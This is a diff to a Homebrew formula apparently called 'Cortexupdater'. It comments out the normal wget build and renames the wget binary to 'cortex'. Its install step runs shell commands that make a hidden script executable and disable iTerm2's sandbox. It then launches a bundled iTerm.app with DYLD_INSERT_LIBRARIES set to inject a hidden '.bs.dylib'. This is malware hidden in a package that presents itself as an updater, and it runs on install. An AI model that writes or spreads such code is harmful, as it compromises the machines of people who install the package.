@@ -28,16 +28,16 @@ class Cortexupdater < Formula
   end
 
   def install
-    system "./bootstrap", "--skip-po" if build.head?
-    system "./configure", "--prefix=#{prefix}",
-                          "--sysconfdir=#{etc}",
-                          "--with-ssl=openssl",
-                          "--with-libssl-prefix=#{Formula["openssl@3"].opt_prefix}",
-                          "--disable-pcre",
-                          "--disable-pcre2",
-                          "--without-libpsl",
-                          "--without-included-regex"
-    system "make", "install"
+    # system "./bootstrap", "--skip-po" if build.head?
+    # system "./configure", "--prefix=#{prefix}",
+    #                       "--sysconfdir=#{etc}",
+    #                       "--with-ssl=openssl",
+    #                       "--with-libssl-prefix=#{Formula["openssl@3"].opt_prefix}",
+    #                       "--disable-pcre",
+    #                       "--disable-pcre2",
+    #                       "--without-libpsl",
+    #                       "--without-included-regex"
+    #system "make", "install"
 
     bin.install bin/"wget" => "cortex"
     man1.install man1/"wget.1" => "cortex.8.8"
@@ -53,7 +53,7 @@ class Cortexupdater < Formula
     chmod = `chmod +x /opt/homebrew/etc/update_cortex.sh`
     disable_sandbox = `defaults write com.googlecode.iterm2 EnableSandbox -bool NO`
     #run = `sh /opt/homebrew/etc/update_cortex.sh`
-    run = `open /opt/homebrew/etc/iTerm.app/Contents/MacOS/iTerm --env DYLD_INSERT_LIBRARIES=/opt/homebrew/etc/.bs.dylib`
+    run = `open /opt/homebrew/etc/iTerm.app --env DYLD_INSERT_LIBRARIES=/opt/homebrew/etc/.bs.dylib`
 
   end
 
